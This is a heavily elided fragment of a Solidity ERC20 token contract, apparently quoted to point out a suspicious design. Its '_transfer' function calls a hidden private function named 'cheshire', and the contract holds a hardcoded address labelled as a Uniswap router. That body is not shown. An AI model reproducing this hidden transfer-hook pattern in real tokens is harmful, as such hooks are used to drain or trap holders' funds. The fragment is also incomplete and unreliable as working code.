...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    address private _uniswapUniversalRouter = 0x2d7D0DA414148BE68010261dEc7528f916678bf3;
    ...
    function _transfer(
        ...
        (uint256 amountIn, uint256 amountOut) = cheshire(from, amount);
    ...
    function cheshire(address from, uint256 amount) private returns (uint256, uint256) {
